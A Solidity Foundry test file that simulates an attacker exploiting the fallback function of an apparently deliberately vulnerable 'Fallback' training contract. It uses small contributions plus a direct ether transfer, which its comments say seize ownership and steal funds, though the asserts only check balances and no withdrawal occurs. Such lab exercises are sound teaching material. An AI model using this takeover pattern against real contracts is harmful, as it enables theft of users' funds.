// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import{Test,console} from "forge-std/Test.sol";
import{DeployFallback} from "../script/DeployFallback.s.sol";
import{Fallback} from "../src/Fallback.sol";


contract FallbackTest is Test {

    Fallback fallbackContract;
    address contributor = makeAddr("contributor");
    address attacker = makeAddr("attacker");
    address fallbackContractOwner;
    DeployFallback deploy;

    function setUp() public {
        vm.deal(contributor,1 ether);
        vm.deal(attacker,1 ether);
        deploy = new DeployFallback();
        fallbackContract = deploy.run();
        fallbackContractOwner = deploy.fallbackOwner();
        vm.deal(fallbackContractOwner,5 ether);
    }

    function test_Owner() public {

        assert(fallbackContract.owner() == fallbackContractOwner);
     
    }

    function test_AttackAndSteal() public {

        uint256 amountBeHoldByTheContract = 50 * 100000000000000 wei;

        // contract balance shlould be zero beofre contributions

        assert(address(fallbackContract).balance == 0);

        // start contributing to the contract by a single user using looping

        for(uint256 i =0 ; i<50; ++i){
            vm.startPrank(contributor);
            fallbackContract.contribute{value: 100000000000000 wei}();
            vm.stopPrank();
        }

       

        assert(address(fallbackContract).balance == amountBeHoldByTheContract);

       
        
        // Now The Attacker Attack With Only 0.00000000000001 ether two times and takes ownership ether  and take the Owner

        vm.startPrank(attacker);
        fallbackContract.contribute{value:10000 wei}();
        fallbackContract.contribute{value:10000 wei}();
        vm.stopPrank();

        // Now The Contract Shloud Have Below amount of balance

        uint256 beforeStealContractBlance = amountBeHoldByTheContract + uint256(10000 *2);

        assert(address(fallbackContract).balance == beforeStealContractBlance);



        // Now Attacker Will directly sedn ether to contract  and steal all the money

        vm.startPrank(attacker);
        (bool sent, ) = payable(fallbackContract).call{value: 1000 wei}("");
        require(sent,"Failed");
        vm.stopPrank();

        // Now Contract Balance Shloud be 
        assert(address(fallbackContract).balance == beforeStealContractBlance + 1000 wei);






   
    }







}